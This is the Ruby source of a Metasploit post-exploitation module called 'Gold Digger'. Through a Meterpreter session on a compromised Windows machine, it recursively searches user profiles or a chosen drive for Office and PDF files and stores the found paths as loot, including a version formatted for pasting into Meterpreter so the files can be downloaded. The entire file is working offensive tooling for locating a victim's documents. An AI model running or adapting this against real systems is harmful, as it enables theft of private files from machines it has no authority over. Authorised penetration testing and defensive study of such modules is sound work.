##
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Auxiliary::Report

    def initialize(info={})
      super( update_info( info,
        'Name'          => 'Windows Search and Index File Types for Download (aka Gold Digger)',
        'Description'   => %q{
          By default this module looks for all office files, creates a list and the path to those files to download later if you want (check your loot folder).
          Creates two output files in loot. One with the easy paste into meterpreter path and second that is more readable. By default will search the profile directory ie C:\users\victim\.
          Notes: Does not decend into C:\Users\$user\AppData by default (not sure why). You have to force that directory with the SEARCH_FROM option. Based on enum_files.rb.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            '3vi1john <Jbabio[at]me.com>', #enum_files.rb
            'RageLtMan <rageltman[at]sempervictus>', #enum_files.rb
            'CG'
          ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
        ))

        register_options(
          [
            OptString.new('SEARCH_FROM', [ false, 'Search from a specific location. Ex. C:\\']),
            OptString.new('FILE_GLOBS',  [ true, 'The file pattern to search for in a filename', '*.doc*,*.xls*,*.ppt*,*.pdf']),
          ], self.class)
        end

        def get_drives
          ##All Credit Goes to mubix for this railgun-FU
          a = client.railgun.kernel32.GetLogicalDrives()["return"]
          drives = []
          letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
          (0..25).each do |i|
            test = letters[i,1]
            rem = a % (2**(i+1))
              if rem > 0
                drives << test
                a = a - rem
                end
              end
            return drives
        end

        def download_files(location, file_type)
    sysdriv = client.fs.file.expand_path("%SYSTEMDRIVE%")
    sysnfo = client.sys.config.sysinfo['OS']
    profile_path_old = sysdriv + "\\Documents and Settings\\"
    profile_path_new = sysdriv + "\\Users\\"

    if location
      print_status("Searching #{location} for #{file_type}")
      getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)

    elsif sysnfo =~/(Windows XP|2003|.NET)/
      print_status("Searching #{profile_path_old} for #{file_type} through windows user profile structure")
      getfile = client.fs.file.search(profile_path_old,file_type,recurse=true,timeout=-1)
    else
    # For systems such as: Windows 7|Windows Vista|2008
      print_status("Searching #{profile_path_new} for #{file_type} through windows user profile structure")
      getfile = client.fs.file.search(profile_path_new,file_type,recurse=true,timeout=-1)
    end

    data_out = []
    data = []
    getfile.each do |file|
      filename = "#{file['path']}\\#{file['name']}"
      data_out << filename
      print_status("Found #{file['path']}\\#{file['name']} adding to the list")
    end
    p = store_loot("CLEAN-#{file_type}.files", 'text/plain', session, data_out.join("\n"), nil, file_type)
    data = data_out.each { |x| x.gsub!("\\", "\\\\\\")}.join("\n") #so we can paste it into meterp
    q = store_loot("PASTABLE-#{file_type}.files", 'text/plain', session, data, nil, file_type)
        end

  def run
  # When the location is set, make sure we have a valid path format
    location = datastore['SEARCH_FROM']
    if location and location !~ /^([a-z])\:[\\|\/].*/i
      print_error("Invalid SEARCH_FROM option: #{location}")
    return
  end

  # When the location option is set, make sure we have a valid drive letter
  my_drive = $1
  drives = get_drives
  if location and not drives.include?(my_drive)
    print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
  return
  end

  datastore['FILE_GLOBS'].split(",").each do |glob|
    begin
      download_files(location, glob.strip)
    rescue ::Rex::Post::Meterpreter::RequestError => e

    if e.message =~ /The device is not ready/
      print_error("#{my_drive} drive is not ready")
      next
    elsif e.message =~ /The system cannot find the path specified/
      print_error("Path does not exist")
      next
    else
      raise e
    end
    end
  end

    print_status("Done!")
  end
end
